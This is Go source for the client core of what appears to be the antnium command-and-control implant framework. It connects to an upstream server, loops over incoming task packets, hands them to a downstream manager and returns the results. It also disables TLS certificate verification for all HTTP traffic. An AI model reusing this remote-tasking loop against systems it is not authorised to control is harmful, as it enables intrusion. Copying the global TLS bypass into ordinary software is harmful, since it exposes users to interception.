package client

import (
	"crypto/tls"
	"errors"
	"math/rand"
	"net/http"
	"time"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

var ErrNoPacketsFound = errors.New("Server did not return any packets")

type Client struct {
	Config   *ClientConfig
	Campaign *campaign.Campaign

	UpstreamManager   *UpstreamManager
	DownstreamManager *DownstreamManager
}

func NewClient() Client {
	config := MakeClientConfig()
	campaign := campaign.MakeCampaign()
	upstreamManager := MakeUpstreamManager(&config, &campaign)
	downstreamManager := MakeDownstreamManager(&config, &upstreamManager)

	if campaign.AutoStartDownstreams {
		_, err := downstreamManager.StartListeners()
		if err != nil {
			log.Error("Error starting downstream listener: %s. Continue.", err.Error())
		}
	}

	// Init random for packet id generation
	// Doesnt need to be secure
	rand.Seed(time.Now().Unix())

	w := Client{
		&config,
		&campaign,
		&upstreamManager,
		&downstreamManager,
	}
	return w
}

// Start will connect to upstream. Required before using Loop()
func (c *Client) Start() {
	// Connect even with invalid TLS certificates (e.g. Mitm proxy)
	// by enable SkipVerify on all instances of http
	//   https://stackoverflow.com/questions/12122159/how-to-do-a-https-request-with-bad-certificate
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	c.UpstreamManager.Connect()
}

// Loop will forever check for new packets from server
func (c *Client) Loop() {
	var p model.Packet
	for {
		// Block until we receive a packet from server
		p = <-c.UpstreamManager.Channel

		go func() {
			p, err := c.DownstreamManager.DoIncomingPacket(p)
			if err != nil {
				log.Error("Err: ", err.Error())
			}

			// Send answer back to server
			c.UpstreamManager.DoOutgoingPacket(p)
		}()
	}
}
